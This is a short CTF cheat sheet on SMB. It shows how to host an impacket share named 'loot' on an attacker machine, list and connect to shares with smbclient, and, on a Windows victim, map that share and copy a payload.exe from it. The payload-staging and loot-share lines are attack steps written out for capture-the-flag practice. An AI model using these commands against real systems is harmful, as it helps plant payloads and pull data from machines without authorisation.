# SMB Misuse

```
Description: SMB (Server Message Block) in a CTF means setting up an SMB server (to host or capture files) or connecting to an SMB share (client)

On Kali Linux:
# Syntax: impacket-smbserver shareName /path/to/share
impacket-smbserver loot /home/kali/share -smb2support       python3 /opt/impacket/examples/smbserver.py loot /tmp/share
Note: your share is accessible \\ATTACKER-IP\loot

```

# SMB Client (Victim or Local Testing)(Linux)
```
smbclient //10.10.10.125/share -U username                  smbclient -N //10.10.10.125/share

# List shares
smbclient -N -L //10.10.10.125
```

# SMB Client (Victim or Local Testing)(Windows)
```
Run cmd.exe or PowerShell

# List Drives (Execute on Victim) 
net view \\192.168.0.1

net use Z: \\192.168.1.100\loot                             copy \\192.168.1.100\loot\payload.exe C:\Temp\
```

## Back to README.md
[BACK](/README.md)